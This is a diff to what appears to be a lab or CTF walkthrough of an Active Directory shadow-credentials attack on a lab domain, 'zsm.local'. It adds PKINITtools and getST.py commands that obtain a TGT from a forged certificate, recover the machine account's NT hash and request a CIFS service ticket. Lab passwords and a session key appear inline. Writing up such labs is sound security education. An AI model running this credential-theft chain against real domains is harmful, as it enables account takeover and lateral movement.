@@ -187,7 +187,10 @@ python3 pywhisker.py -d "zsm.local" -u "marcus" -p "\!QAZ2wsx" -t "ZPH-SVRMGMT1$
 Clone the [PKINITtools](https://github.com/dirkjanm/PKINITtools) repository for utilities to generate a TGT
 
 ```
-python3 PKINITtools/gettgtpkinit.py -cert-pfx UvWSLQEU.pfx -pfx-pass uq1SMyetoBSAUdZxTpOH zsm.local/ZPH-SVRMGMT1$ UvWSLQEU.ccache
+python3 PKINITtools/gettgtpkinit.py -cert-pfx UvWSLQEU.pfx -pfx-pass uq1SMyetoBSAUdZxTpOH zsm.local/ZPH-SVRMGMT1$ UvWSLQEU.ccache (Retrieve TGT)
+python3 PKINITtools/getnthash.py -key f1969ba89e75d5893b06b1bf946e08d336ca04d82152f69fa2882021ce214172 -dc-ip 192.168.210.10 zsm.local/ZPH-SVRMGMT1$ (Recover NT hash)
+
+getST.py -k -no-pass ZPH-SVRMGMT1\$@192.168.210.11 -spn CIFS/ZPH-SVRMGMT1.ZSM.LOCAL -debug -dc-ip 192.168.210.10 (Retrieve CIFS TGT ticket)
 ```
 
 **Additional Resources**
